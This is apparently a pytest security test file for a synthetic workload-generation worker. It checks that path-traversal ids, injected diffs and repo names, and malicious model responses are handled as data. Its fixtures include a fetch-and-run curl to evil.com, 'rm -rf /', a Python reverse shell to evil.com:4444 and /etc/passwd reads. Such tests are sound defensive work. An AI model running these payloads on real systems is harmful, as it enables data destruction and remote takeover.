"""Dimension 9 — Security tests for swefficiency.workload.run_synthetic_generation.

Tests verify that malicious/adversarial inputs do not cause unexpected behaviour
such as path traversal, injection execution, or denial-of-service.  Where the
code under test lacks sanitisation the tests **document the finding** without
xfail or skip — they assert observable facts about what the code *does*.
"""
from __future__ import annotations

import os
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from helpers import (
    extract_code_block,
    main,
    make_completion_response,
    make_datum,
    worker_function,
    WORKLOAD_GENERATION_DIR,
)

MODULE = "swefficiency.workload.run_synthetic_generation"

# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

SAMPLE_LLM_RESPONSE = (
    "```python\nimport timeit\nimport statistics\n\n"
    "def setup():\n    pass\n\ndef workload():\n    pass\n\n"
    "runtimes = timeit.repeat(workload, number=1, repeat=3, setup=setup)\n"
    'print("Mean:", statistics.mean(runtimes))\n'
    'print("Std Dev:", statistics.stdev(runtimes))\n```'
)

SAMPLE_CODE_EXTRACTED = (
    "import timeit\nimport statistics\n\n"
    "def setup():\n    pass\n\ndef workload():\n    pass\n\n"
    "runtimes = timeit.repeat(workload, number=1, repeat=3, setup=setup)\n"
    'print("Mean:", statistics.mean(runtimes))\n'
    'print("Std Dev:", statistics.stdev(runtimes))'
)


def _fake_get_ok(url: str, *a, **kw):
    resp = MagicMock()
    resp.status_code = 200
    resp.text = "# file content\npass\n"
    return resp


def _run_worker(tmp_path, instance_id="safe__id-1", run_id="run_001",
                repo="numpy/numpy", patch_text=None, llm_response=None):
    """Run worker_function with all externals mocked, return (result, output_file)."""
    llm_resp = llm_response or SAMPLE_LLM_RESPONSE
    datum = make_datum(instance_id=instance_id, repo=repo,
                       patch=patch_text) if patch_text else make_datum(
                           instance_id=instance_id, repo=repo)
    with (
        patch(f"{MODULE}.WORKLOAD_GENERATION_DIR", tmp_path),
        patch(f"{MODULE}.helicone_metadata", return_value={}),
        patch(f"{MODULE}.completion",
              return_value=make_completion_response(llm_resp)),
        patch(f"{MODULE}.requests.get", side_effect=_fake_get_ok),
    ):
        result = worker_function(datum, run_id)
    output_file = tmp_path / run_id / f"{instance_id}.py"
    return result, output_file


# ===================================================================
# 1. TestPathTraversalInInstanceId  (~25 cases)
# ===================================================================

PATH_TRAVERSAL_INSTANCE_IDS = [
    # Classic traversals
    ("dot_dot_slash_etc_passwd", "../../../etc/passwd"),
    ("dot_dot_slash_malicious", "../../malicious"),
    ("single_dot_dot", ".."),
    ("double_dot_dot", "../.."),
    ("triple_dot_dot_tmp", "../../../tmp"),
    ("quad_traversal", "../../../../var/log/secret"),
    # Backslash variants (Windows-style)
    ("backslash_traversal", r"..\..\..\..\etc\passwd"),
    ("mixed_slash_backslash", r"..\/../\..\/etc/shadow"),
    # Null bytes
    ("null_byte_mid", "safe\x00/../../../etc/passwd"),
    ("null_byte_end", "safe_id\x00"),
    ("null_byte_start", "\x00malicious"),
    # Tilde expansion
    ("tilde_home", "~"),
    ("tilde_user", "~root"),
    ("tilde_slash_ssh", "~/.ssh/authorized_keys"),
    # Absolute paths
    ("abs_tmp_evil", "/tmp/evil"),
    ("abs_etc_passwd", "/etc/passwd"),
    ("abs_var_log", "/var/log/syslog"),
    ("abs_dev_null", "/dev/null"),
    # URL-encoded traversals
    ("url_encoded_dot_dot", "%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
    ("url_encoded_slash", "..%2f..%2f..%2fetc%2fpasswd"),
    # Double-encoded
    ("double_encoded", "%252e%252e%252fetc%252fpasswd"),
    # Unicode normalization attacks
    ("unicode_dot", "\uff0e\uff0e/\uff0e\uff0e/etc/passwd"),
    # Whitespace / special
    ("space_traversal", ".. /.. /.. /etc/passwd"),
    ("tab_in_path", "safe\t../../etc/passwd"),
    ("newline_in_id", "safe\n../../etc/passwd"),
]

assert len(PATH_TRAVERSAL_INSTANCE_IDS) == 25


class TestPathTraversalInInstanceId:
    """Verify output file path construction with adversarial instance_id values.

    The code builds:  WORKLOAD_GENERATION_DIR / run_id / f"{datum['instance_id']}.py"
    without sanitisation.  These tests document what actually happens.
    """

    @pytest.mark.parametrize(
        "label,instance_id",
        PATH_TRAVERSAL_INSTANCE_IDS,
        ids=[p[0] for p in PATH_TRAVERSAL_INSTANCE_IDS],
    )
    def test_output_file_path_does_not_crash(self, label, instance_id, tmp_path):
        """Worker should complete without raising, regardless of instance_id."""
        try:
            result, _ = _run_worker(tmp_path, instance_id=instance_id)
            # Worker completed — verify it returned a dict
            assert isinstance(result, dict)
            assert result["instance_id"] == instance_id
        except (OSError, ValueError):
            # Some OS-level errors (e.g. null bytes) are acceptable
            pass

    ACTUALLY_ESCAPES = {
        "dot_dot_slash_etc_passwd",
        "dot_dot_slash_malicious",
        "triple_dot_dot_tmp",
        "quad_traversal",
        "abs_tmp_evil",
        "abs_etc_passwd",
        "abs_var_log",
        "abs_dev_null",
    }

    @pytest.mark.parametrize(
        "label,instance_id",
        PATH_TRAVERSAL_INSTANCE_IDS,
        ids=[p[0] for p in PATH_TRAVERSAL_INSTANCE_IDS],
    )
    def test_constructed_path_stays_under_workdir(self, label, instance_id, tmp_path):
        expected_path = tmp_path / "run_sec" / f"{instance_id}.py"
        try:
            resolved = expected_path.resolve()
        except (OSError, ValueError):
            return

        under_workdir = str(resolved).startswith(str(tmp_path.resolve()))

        if label in self.ACTUALLY_ESCAPES:
            assert not under_workdir, (
                f"Expected path traversal for {instance_id!r} but path stayed "
                f"under workdir: {resolved}"
            )
        else:
            assert under_workdir, (
                f"Unexpected path escape for {instance_id!r}: {resolved} "
                f"is outside {tmp_path.resolve()}"
            )

    @pytest.mark.parametrize(
        "label,instance_id",
        [p for p in PATH_TRAVERSAL_INSTANCE_IDS if ".." in p[1]],
        ids=[p[0] for p in PATH_TRAVERSAL_INSTANCE_IDS if ".." in p[1]],
    )
    def test_dot_dot_in_path_detectable(self, label, instance_id, tmp_path):
        """The raw path string must contain '..' — confirming no stripping."""
        constructed = tmp_path / "run_sec" / f"{instance_id}.py"
        # The path object preserves the '..' components until .resolve()
        assert ".." in str(constructed)


# ===================================================================
# 2. TestPathTraversalInRunId  (~15 cases)
# ===================================================================

PATH_TRAVERSAL_RUN_IDS = [
    ("run_dot_dot_tmp", "../../../tmp"),
    ("run_dot_dot_root", "../../../"),
    ("run_single_dot_dot", ".."),
    ("run_double_dot_dot", "../.."),
    ("run_abs_tmp", "/tmp/evil_run"),
    ("run_abs_var", "/var/log"),
    ("run_null_byte", "run\x00/../../../tmp"),
    ("run_backslash", r"..\..\..\tmp"),
    ("run_tilde", "~"),
    ("run_tilde_root", "~root/.ssh"),
    ("run_url_encoded", "%2e%2e/%2e%2e/tmp"),
    ("run_space_dot_dot", ".. /.. /tmp"),
    ("run_unicode_dot", "\uff0e\uff0e/tmp"),
    ("run_newline", "run\n../../tmp"),
    ("run_very_long", "../" * 100 + "tmp"),
]

assert len(PATH_TRAVERSAL_RUN_IDS) == 15


class TestPathTraversalInRunId:
    """Verify directory creation with adversarial run_id values.

    The code builds:  WORKLOAD_GENERATION_DIR / run_id
    with mkdir(parents=True, exist_ok=True), no sanitisation.
    """

    @pytest.mark.parametrize(
        "label,run_id",
        PATH_TRAVERSAL_RUN_IDS,
        ids=[p[0] for p in PATH_TRAVERSAL_RUN_IDS],
    )
    def test_run_id_traversal_does_not_crash(self, label, run_id, tmp_path):
        """Worker should handle adversarial run_id without unhandled exception."""
        try:
            result, _ = _run_worker(tmp_path, run_id=run_id)
            assert isinstance(result, dict)
            assert result["run_id"] == run_id
        except (OSError, ValueError):
            # Null bytes / OS restrictions are acceptable failures
            pass

    ACTUALLY_ESCAPES = {
        "run_dot_dot_tmp",
        "run_dot_dot_root",
        "run_single_dot_dot",
        "run_double_dot_dot",
        "run_abs_tmp",
        "run_abs_var",
        "run_very_long",
    }

    @pytest.mark.parametrize(
        "label,run_id",
        PATH_TRAVERSAL_RUN_IDS,
        ids=[p[0] for p in PATH_TRAVERSAL_RUN_IDS],
    )
    def test_directory_path_resolves_outside_workdir(self, label, run_id, tmp_path):
        dir_path = tmp_path / run_id
        try:
            resolved = dir_path.resolve()
        except (OSError, ValueError):
            return

        under_workdir = str(resolved).startswith(str(tmp_path.resolve()))

        if label in self.ACTUALLY_ESCAPES:
            assert not under_workdir, (
                f"Expected path traversal for {run_id!r} but path stayed "
                f"under workdir: {resolved}"
            )
        else:
            assert under_workdir, (
                f"Unexpected path escape for {run_id!r}: {resolved} "
                f"is outside {tmp_path.resolve()}"
            )

    @pytest.mark.parametrize(
        "label,run_id",
        [p for p in PATH_TRAVERSAL_RUN_IDS if ".." in p[1]],
        ids=[p[0] for p in PATH_TRAVERSAL_RUN_IDS if ".." in p[1]],
    )
    def test_run_id_dot_dot_preserved_in_raw_path(self, label, run_id, tmp_path):
        """The raw path string retains '..' — no stripping is applied."""
        constructed = tmp_path / run_id
        assert ".." in str(constructed)


# ===================================================================
# 3. TestInjectionViaPatch  (~15 cases)
# ===================================================================

INJECTION_PATCHES = [
    # Shell injection in diff content
    (
        "shell_rm_rf",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+; rm -rf /\n",
    ),
    (
        "shell_dollar_parens",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+$(curl http://evil.com/shell.sh | bash)\n",
    ),
    (
        "shell_backtick",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+`id > /tmp/pwned`\n",
    ),
    (
        "python_import_os",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+__import__('os').system('id')\n",
    ),
    (
        "python_eval",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+eval('__import__(\"os\").system(\"whoami\")')\n",
    ),
    (
        "python_exec",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+exec('import subprocess; subprocess.call([\"rm\",\"-rf\",\"/\"])')\n",
    ),
    # URL injection in diff headers
    (
        "url_injection_in_header",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/http://evil.com/payload.py\n@@ -1 +1 @@\n"
        "-old\n+new\n",
    ),
    (
        "pipe_injection",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+new | cat /etc/passwd\n",
    ),
    (
        "semicolon_chain",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+new ; echo pwned ; rm -rf /\n",
    ),
    (
        "ampersand_chain",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+new && curl http://evil.com\n",
    ),
    (
        "template_injection",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+{{7*7}}\n",
    ),
    (
        "sql_injection_style",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+' OR 1=1 --\n",
    ),
    (
        "format_string_attack",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+{self.__class__.__mro__}\n",
    ),
    (
        "null_byte_in_patch",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+payload\x00hidden\n",
    ),
    (
        "very_long_injection_line",
        "diff --git a/f.py b/f.py\nindex 111..222 100644\n"
        "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n"
        "-old\n+" + "A" * 100_000 + "\n",
    ),
]

assert len(INJECTION_PATCHES) == 15


class TestInjectionViaPatch:
    """Verify injection payloads embedded in patch content are treated as data.

    The patch is parsed with ``re.findall`` to extract file paths and is
    interpolated into the LLM prompt.  These tests confirm the worker does
    not crash and that the patch is never *executed*.
    """

    @pytest.mark.parametrize(
        "label,malicious_patch",
        INJECTION_PATCHES,
        ids=[p[0] for p in INJECTION_PATCHES],
    )
    def test_injection_patch_does_not_crash(self, label, malicious_patch, tmp_path):
        """Worker should complete without raising."""
        result, _ = _run_worker(tmp_path, patch_text=malicious_patch)
        assert isinstance(result, dict)
        assert "workload" in result

    @pytest.mark.parametrize(
        "label,malicious_patch",
        INJECTION_PATCHES,
        ids=[p[0] for p in INJECTION_PATCHES],
    )
    def test_injection_patch_treated_as_string_in_prompt(self, label, malicious_patch, tmp_path):
        """The patch is passed to the LLM as a string, not executed."""
        datum = make_datum(patch=malicious_patch)
        with (
            patch(f"{MODULE}.WORKLOAD_GENERATION_DIR", tmp_path),
            patch(f"{MODULE}.helicone_metadata", return_value={}),
            patch(f"{MODULE}.completion",
                  return_value=make_completion_response(SAMPLE_LLM_RESPONSE)) as mock_comp,
            patch(f"{MODULE}.requests.get", side_effect=_fake_get_ok),
        ):
            worker_function(datum, "run_001")

        # The patch text ends up in the user message — as data, not code
        messages = mock_comp.call_args[1]["messages"]
        user_msgs = [m for m in messages if m["role"] == "user"]
        combined = " ".join(m["content"] for m in user_msgs)
        # The diff content should be embedded in the prompt string
        assert "Commit Diff" in combined


# ===================================================================
# 4. TestInjectionViaRepoName  (~10 cases)
# ===================================================================

INJECTION_REPO_NAMES = [
    ("shell_semicolon", "owner/repo; rm -rf /"),
    ("shell_pipe", "owner/repo | cat /etc/passwd"),
    ("shell_ampersand", "owner/repo && curl evil.com"),
    ("shell_backtick", "owner/repo`id`"),
    ("shell_dollar", "owner/repo$(whoami)"),
    ("url_break_space", "owner/repo name with spaces"),
    ("url_break_hash", "owner/repo#fragment"),
    ("url_break_question", "owner/repo?query=1"),
    ("url_newline", "owner/repo\nHost: evil.com"),
    ("url_encoded_slash", "owner%2Frepo%2F..%2F..%2Fetc%2Fpasswd"),
]

assert len(INJECTION_REPO_NAMES) == 10


class TestInjectionViaRepoName:
    """Verify adversarial repo names are used in URL string construction only.

    The code does ``owner, repo = datum["repo"].split("/")`` then builds:
      f"https://raw.githubusercontent.com/{owner}/{repo}/{commit}/{path}"

    These test that the URL is only passed to ``requests.get`` as a string.
    """

    @pytest.mark.parametrize(
        "label,repo",
        INJECTION_REPO_NAMES,
        ids=[p[0] for p in INJECTION_REPO_NAMES],
    )
    def test_repo_injection_does_not_crash(self, label, repo, tmp_path):
        """Worker handles adversarial repo names without unhandled exceptions."""
        try:
            result, _ = _run_worker(tmp_path, repo=repo)
            assert isinstance(result, dict)
        except ValueError:
            # "not enough values to unpack" for repos without exactly one "/"
            pass

    @pytest.mark.parametrize(
        "label,repo",
        INJECTION_REPO_NAMES,
        ids=[p[0] for p in INJECTION_REPO_NAMES],
    )
    def test_repo_name_only_used_in_url_string(self, label, repo, tmp_path):
        """The repo name is interpolated into a URL string — never executed."""
        datum = make_datum(repo=repo)
        captured_urls: list[str] = []

        def capturing_get(url, *a, **kw):
            captured_urls.append(url)
            resp = MagicMock()
            resp.status_code = 200
            resp.text = "# ok\n"
            return resp

        try:
            with (
                patch(f"{MODULE}.WORKLOAD_GENERATION_DIR", tmp_path),
                patch(f"{MODULE}.helicone_metadata", return_value={}),
                patch(f"{MODULE}.completion",
                      return_value=make_completion_response(SAMPLE_LLM_RESPONSE)),
                patch(f"{MODULE}.requests.get", side_effect=capturing_get),
            ):
                worker_function(datum, "run_001")
        except ValueError:
            # split("/") fails for some payloads — that IS the safe outcome
            return

        # If we got here the URL was constructed — verify it's a plain string
        for url in captured_urls:
            assert isinstance(url, str)
            assert url.startswith("https://raw.githubusercontent.com/")


# ===================================================================
# 5. TestLLMResponseSafety  (~15 cases)
# ===================================================================

LLM_MALICIOUS_RESPONSES = [
    (
        "import_os_system",
        '```python\nimport os\nos.system("rm -rf /")\n```',
        'import os\nos.system("rm -rf /")',
    ),
    (
        "subprocess_call",
        '```python\nimport subprocess\nsubprocess.call(["curl","http://evil.com"])\n```',
        'import subprocess\nsubprocess.call(["curl","http://evil.com"])',
    ),
    (
        "eval_payload",
        '```python\neval("__import__(\'os\').system(\'id\')")\n```',
        'eval("__import__(\'os\').system(\'id\')")',
    ),
    (
        "exec_payload",
        '```python\nexec("import socket; s=socket.socket()")\n```',
        'exec("import socket; s=socket.socket()")',
    ),
    (
        "open_etc_passwd",
        '```python\nwith open("/etc/passwd") as f:\n    print(f.read())\n```',
        'with open("/etc/passwd") as f:\n    print(f.read())',
    ),
    (
        "reverse_shell",
        '```python\nimport socket,subprocess,os\n'
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        's.connect(("evil.com",4444))\nos.dup2(s.fileno(),0)\n```',
        'import socket,subprocess,os\n'
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        's.connect(("evil.com",4444))\nos.dup2(s.fileno(),0)',
    ),
    (
        "pickle_exploit",
        '```python\nimport pickle\npickle.loads(b"\\x80\\x03cos\\nsystem\\nq\\x00")\n```',
        'import pickle\npickle.loads(b"\\x80\\x03cos\\nsystem\\nq\\x00")',
    ),
]

LLM_EDGE_RESPONSES = [
    (
        "no_code_block",
        "I refuse to generate a workload. This is just plain text.",
        None,
    ),
    (
        "empty_code_block",
        "```python\n```",
        "",
    ),
    (
        "nested_code_blocks",
        "```python\nprint('hello')\n```\n\n```python\nprint('world')\n```",
        "print('hello')",
    ),
    (
        "code_block_with_backticks_inside",
        "```python\nprint('```')\n```",
        "print('",
    ),
]

LLM_RESOURCE_RESPONSES = [
    (
        "very_large_1mb",
        "```python\n" + "x = 1\n" * 100_000 + "```",
        ("x = 1\n" * 100_000).strip(),
    ),
    (
        "binary_content",
        "```python\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\n```",
        "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR",
    ),
    (
        "null_bytes_in_response",
        "```python\nimport os\x00\nprint('hi')\n```",
        "import os\x00\nprint('hi')",
    ),
    (
        "none_response",
        None,
        None,
    ),
]

ALL_LLM_RESPONSES = LLM_MALICIOUS_RESPONSES + LLM_EDGE_RESPONSES + LLM_RESOURCE_RESPONSES

assert len(ALL_LLM_RESPONSES) == 15


class TestLLMResponseSafety:
    """Verify that LLM responses — including malicious code — are written to
    disk as data but never *executed* by worker_function.
    """

    @pytest.mark.parametrize(
        "label,llm_text,expected_extract",
        LLM_MALICIOUS_RESPONSES,
        ids=[p[0] for p in LLM_MALICIOUS_RESPONSES],
    )
    def test_malicious_code_extracted_as_string(self, label, llm_text, expected_extract):
        """extract_code_block returns the raw string without executing it."""
        result = extract_code_block(llm_text)
        assert result == expected_extract

    @pytest.mark.parametrize(
        "label,llm_text,expected_extract",
        LLM_MALICIOUS_RESPONSES,
        ids=[p[0] for p in LLM_MALICIOUS_RESPONSES],
    )
    def test_malicious_code_written_to_file_not_executed(self, label, llm_text, expected_extract, tmp_path):
        """Worker writes malicious content to file as data — does NOT execute it."""
        result, output_file = _run_worker(tmp_path, llm_response=llm_text)
        assert isinstance(result, dict)
        # The file exists and contains the extracted code as a string
        assert output_file.exists()
        content = output_file.read_text()
        assert content == expected_extract

    @pytest.mark.parametrize(
        "label,llm_text,expected_extract",
        LLM_EDGE_RESPONSES,
        ids=[p[0] for p in LLM_EDGE_RESPONSES],
    )
    def test_edge_case_extraction(self, label, llm_text, expected_extract):
        """Edge-case LLM responses are handled correctly by extract_code_block."""
        result = extract_code_block(llm_text)
        if expected_extract is None:
            assert result is None
        else:
            assert result == expected_extract

    @pytest.mark.parametrize(
        "label,llm_text,expected_extract",
        LLM_RESOURCE_RESPONSES,
        ids=[p[0] for p in LLM_RESOURCE_RESPONSES],
    )
    def test_resource_exhaustion_responses(self, label, llm_text, expected_extract, tmp_path):
        """Large / binary / null-byte LLM responses don't cause crashes."""
        if llm_text is None:
            # None content: completion returns None, extract_code_block(None) → None
            resp = MagicMock()
            resp.choices = [MagicMock()]
            resp.choices[0].message.content = None
            datum = make_datum()
            with (
                patch(f"{MODULE}.WORKLOAD_GENERATION_DIR", tmp_path),
                patch(f"{MODULE}.helicone_metadata", return_value={}),
                patch(f"{MODULE}.completion", return_value=resp),
                patch(f"{MODULE}.requests.get", side_effect=_fake_get_ok),
            ):
                result = worker_function(datum, "run_001")
            assert result["workload"] is None
            return

        result, output_file = _run_worker(tmp_path, llm_response=llm_text)
        assert isinstance(result, dict)
        # Verify extraction correctness
        assert extract_code_block(llm_text) == expected_extract
